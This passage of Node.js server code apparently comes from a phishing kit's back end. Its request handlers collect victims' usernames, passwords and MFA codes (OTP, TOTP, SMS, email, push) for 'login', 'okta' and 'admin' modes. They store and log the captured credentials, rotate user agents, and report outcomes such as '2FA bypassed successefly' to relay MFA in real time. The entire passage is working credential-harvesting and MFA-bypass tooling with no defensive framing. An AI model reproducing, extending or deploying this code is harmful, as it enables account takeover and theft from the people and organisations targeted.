  }else if(typeof req.query.putcode !== 'undefined' && typeof req.query.code !== 'undefined' && typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined' && typeof req.query.type !== 'undefined' && ["pass","otp","cotp","totp","push","gotp","gpush","email","sms"].includes(decodeURI(req.query.type))&& typeof req.query.mode !== 'undefined' && ["login", "okta", "admin"].includes(decodeURI(req.query.mode))){
      
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//var typesArray = ["password", "otp", "totp", "gotp", "cotp", "email"];
    var codeType = decodeURI(req.query.type);   
    var putMode = decodeURI(req.query.mode); 
console.log('putcode '+putMode+' / '+codeType+' : '+req.query.code);
if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['code'] !== 'undefined'/*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType] !== false*/){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log('Code before putcode: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['code']);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['code']=req.query.code;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['time']=Date.now();
console.log('Putcode: ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["mfa"]["'+codeType+'"]["code"]: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['code']);
try{
var isPottEd = false;
if(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['code']==req.query.code){
isPottEd = true;  
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType][OktaCode]=false;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['result']=false;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType]['retry']=false;

}
}catch(ee){console.log('error catch isPottEd:'+ee);}

    }


if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']!=="Pending" && ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']!=="Queuing"){
}
  
  
  if(isPottEd && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']!== 'undefined'/*&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']=="Pending"*/){
  console.log('ResultByIds['+decodeURI(req.query.id)+']:',JSON.stringify(ResultByIds[decodeURI(req.query.id)]));
  
  
  res.write(JSON.stringify({ "StatusCode":0,"Code":req.query.code,"Status": "success","Msg":"Otp code is sent","TaskStatus":ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action'],"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;       
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']!== 'undefined'/*&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action']=="Queuing"*/){
   res.write(JSON.stringify({ "StatusCode":1,"Code":decodeURI(req.query.code),"Status": "failed","Msg":"Retry","TaskStatus":ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['action'],"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;    
  }else{
  res.write(JSON.stringify({ "StatusCode":2,"Code":decodeURI(req.query.code),"Status": "failed","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending  
  
  
  }else if(typeof req.query.putuser !== 'undefined'&& typeof req.query.user !== 'undefined' && typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined' && typeof req.query.mode !== 'undefined' && ["login", "okta", "admin"].includes(decodeURI(req.query.mode))){
      console.log('putuser');
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//var typesArray = ["password", "otp", "totp", "gotp", "cotp", "email"];
    //var userType = decodeURI(req.query.type); //username|email  
    var userName = decodeURI(req.query.user); 
    var putMode = decodeURI(req.query.mode); 
console.log('putuser :'+putMode+' | '+userName);
if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username'] !== 'undefined'/*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username'] !== false*/){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log('Username before putuser: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']=userName;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['time']=Date.now();
console.log('Putuser: ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["user"]["username"]: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']);
try{
var isPottEd = false;
if(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']==userName){
isPottEd = true;  
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType][OktaCode]=false;
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']=false;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['retry']=false;

}
console.log('isPottEd:',isPottEd);
}catch(ee){console.log('error catch isPottEd:'+ee);}

    }

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["user"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user'], null, 4));

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["user"]["username"] :'+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']);
  
  
  if(isPottEd && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']==userName){
  console.log('ResultByIds['+decodeURI(req.query.id)+']:',JSON.stringify(ResultByIds[decodeURI(req.query.id)]));
  
  
  res.write(JSON.stringify({ "StatusCode":0,"User":userName,"Status": "success","Msg":"Username is sent","TaskStatus":'pending',"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;       
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username'] !== 'undefined'){
   res.write(JSON.stringify({ "StatusCode":1,"User":userName,"Status": "failed","Msg":"Retry","TaskStatus":"pending","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;    
  }else{
  res.write(JSON.stringify({ "StatusCode":2,"User":userName,"Status": "failed","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
  }else if(typeof req.query.putlogin !== 'undefined' && typeof req.query.user !== 'undefined' && typeof req.query.code !== 'undefined' && typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined' && typeof req.query.mode !== 'undefined' && ["login", "okta", "admin"].includes(decodeURI(req.query.mode))){

      console.log('putuser');
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//var typesArray = ["password", "otp", "totp", "gotp", "cotp", "email"];
    //var userType = decodeURI(req.query.type); //username|email  
    var userName = decodeURI(req.query.user); 
    var passWord = decodeURI(req.query.code);
    //var isRemember = decodeURI(req.query.remember); 
    var putMode = decodeURI(req.query.mode);
console.log('putlogin :'+putMode+' | '+userName+' | '+passWord);
if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user'] !== 'undefined'/*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username'] !== false*/){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log('Username before putuser: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user']);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user']=userName;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['pass']=passWord;
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['remember']=isRemember;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['time']=Date.now();
console.log('Putlogin: ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["login"]: ',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login'], null, 4));
try{
var isPottEd = false;
if(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user']==userName){
isPottEd = true;  
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType][OktaCode]=false;
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']=false;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['retry']=false;

}
console.log('isPottEd:',isPottEd);
}catch(ee){console.log('error catch isPottEd:'+ee);}

    }

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["login"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login'], null, 4));

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["login"]["user"] :'+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user']);
  
  
  if(isPottEd && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user']==userName){
  console.log('ResultByIds['+decodeURI(req.query.id)+']:',JSON.stringify(ResultByIds[decodeURI(req.query.id)]));
  
  
  res.write(JSON.stringify({ "StatusCode":0,"User":userName,"Code":passWord,"Status": "success","Msg":"Login is sent","TaskStatus":'pending',"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;       
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['login']['user'] !== 'undefined'){
   res.write(JSON.stringify({ "StatusCode":1,"User":userName,"Code":passWord,"Status": "failed","Msg":"Retry","TaskStatus":"pending","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;    
  }else{
  res.write(JSON.stringify({ "StatusCode":2,"User":userName,"Code":passWord,"Status": "failed","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
        
  }else if(typeof req.query.selectauth !== 'undefined'&& typeof req.query.auth !== 'undefined' && ["pass","otp","cotp","totp","push","gotp","gpush","email","sms"].includes(decodeURI(req.query.auth))&& typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined' && typeof req.query.mode !== 'undefined' && ["login", "okta", "admin"].includes(decodeURI(req.query.mode))){
      console.log('putAuth');
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//var typesArray = ["password", "otp", "totp", "gotp", "cotp", "email"];
    //var userType = decodeURI(req.query.type); //username|email  
    var selectedAuth = decodeURI(req.query.auth); 
    var putMode = decodeURI(req.query.mode); 
console.log('putauth :'+putMode+' | '+selectedAuth);
if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type'] !== 'undefined'&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['action'] == 'Waiting'){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log('Auth before putauth: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']=selectedAuth;
ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['time']=Date.now();
console.log('putauth: ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["auth"]["type"]: '+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']);
try{
var isPottEd = false;
if(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']==selectedAuth){
isPottEd = true;  
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['mfa'][codeType][OktaCode]=false;
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['user']['username']=false;
//ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']=false;

}
console.log('isPottEd:',isPottEd);
}catch(ee){console.log('error catch isPottEd:'+ee);}

    }

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["auth"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth'], null, 4));

console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+putMode+'"]["auth"]["type"] :'+ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']);
  
  
  if(isPottEd && typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type']==selectedAuth){
  console.log('ResultByIds['+decodeURI(req.query.id)+']:',JSON.stringify(ResultByIds[decodeURI(req.query.id)]));
  
  
  res.write(JSON.stringify({ "StatusCode":0,"Auth":selectedAuth,"Status": "success","Msg":"Auth is sent","TaskStatus":'pending',"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;       
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][putMode]['auth']['type'] !== 'undefined'){
   res.write(JSON.stringify({ "StatusCode":1,"Auth":selectedAuth,"Status": "failed","Msg":"Retry","TaskStatus":"pending","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;    
  }else{
  res.write(JSON.stringify({ "StatusCode":2,"Auth":selectedAuth,"Status": "failed","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending  
  
  }else if(typeof req.query.validate !== 'undefined' && typeof req.query.email !== 'undefined' && typeof req.query.id !== 'undefined' &&typeof req.query.type !== 'undefined' && ["pass","otp","cotp","totp","push","gotp","gpush","email","sms","username","login"].includes(decodeURI(req.query.type)) &&( ( (typeof req.query.code !== 'undefined'||decodeURI(req.query.type)=="push"))||(typeof req.query.user !== 'undefined') )&& typeof req.query.mode !== 'undefined' && ["login", "okta", "admin"].includes(decodeURI(req.query.mode))){
      
      
var RndUserAgent=getRndUserAgent();
console.log('User-Agent:',RndUserAgent);
if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]!=='undefined'){
console.log('validate:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)], null, 4));
}


if(typeof req.query.code !== 'undefined' && req.query.code.toString().trim().toLowerCase() !=='false'&& (typeof req.query.type == 'undefined' || decodeURI(req.query.type)!=="login")){
    console.log('validate code query: ',req.query);
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)][req.query.code] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)][req.query.code]=="ok" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
  console.log('2FA bypassed successefly');
  console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
  nextauth=false;
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'] !== false){
    nextauth=ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'];
  }
console.log('Validate Url Response:',JSON.stringify({ "StatusCode":0,"Status": "success","Type": "MFA","Msg":"2FA bypassed successefly","Next":nextauth,"Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":0,"Status": "success","Type": "MFA","Msg":"2FA bypassed successefly","Next":nextauth,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
            
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)][req.query.code] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)][decodeURI(req.query.code)]=="no"&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']=="WrongCode" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('Wrong Code');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"] !== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"];
  }
  
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"Wrong Code","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"Wrong Code","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           
}else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['code']!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']=="CodeNotFound" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('CodeNotFound');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"]!=='undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"]!=='undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"];
  }
  
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"CodeNotFound","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"CodeNotFound","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           

  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Pending"){
   console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":2,"Status": "pending","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return; 
  }else if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['action']=="Queuing"){
console.log('Retry');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":3,"Status": "queuing","Type": "MFA","Msg":"Retry","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;             
  }else{
      console.log('Request Failed.');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));
  console.log('Validate Url Response:',JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "MFA","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
  res.write(JSON.stringify({ "StatusCode":4,"Status": "failed","Type": "MFA","Msg":"Request Failed","Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;        
  }
  //ResultByIds[dataId] = "Pending";cluster.jobQueue.pending
  }else if(typeof req.query.type !== 'undefined' && decodeURI(req.query.type)=="push"){
console.log('validate push query: ',req.query);
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']=="PushAppOk" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
  console.log('2FA Push App bypassed successefly');
  console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
  
  
  nextauth=false;
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'] !== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'] !== false){
    nextauth=ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['next'];
  }
  
  
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":0,"Status": "success","Type": "MFA","Msg":"2FA bypassed successefly","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":0,"Status": "success","Type": "MFA","Msg":"2FA bypassed successefly","Next":nextauth,"Time":new Date().toUTCString()}, null, 4));
            res.end();
            //return getRestart(reQnow);
            return;
            
  }else if(typeof  ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']!== 'undefined'&&ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]['result']=="PushAppDenied" /*&& ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][req.query.mode]['action']=="Pending"*/){
console.log('Push App Denied');
console.log('ResultByIds["'+decodeURI(req.query.id)+'"]["'+decodeURI(req.query.email)+'"]["'+decodeURI(req.query.mode)+'"]:',JSON.stringify(ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]));//,null,2
//sms":{"code":false,"result":"WrongCode","retry":true}  
    //"Result": "ExpiredSession"
  //
  if(typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"]!== 'undefined'&&typeof ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"]!== 'undefined'){
   //sms":{"333333":"Wrong","code":false,"result":"WrongCode","retry":true  
   var isresult = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["result"];
   var isretry = ResultByIds[decodeURI(req.query.id)][decodeURI(req.query.email)][decodeURI(req.query.mode)]['mfa'][decodeURI(req.query.type)]["retry"];
  }
  
   console.log('Validate Url Response:',JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"Push App Denied","Time":new Date().toUTCString()}, null, 4));
   res.write(JSON.stringify({ "StatusCode":1,"Status": "failed","Result": isresult,"Type": "MFA","Retry": isretry,"Msg":"Push App Denied","Time":new Date().toUTCString()}, null, 4));
           res.end();
            //return getRestart(reQnow);
            return;
   // You didn't enter the expected verification code. Please try again.           
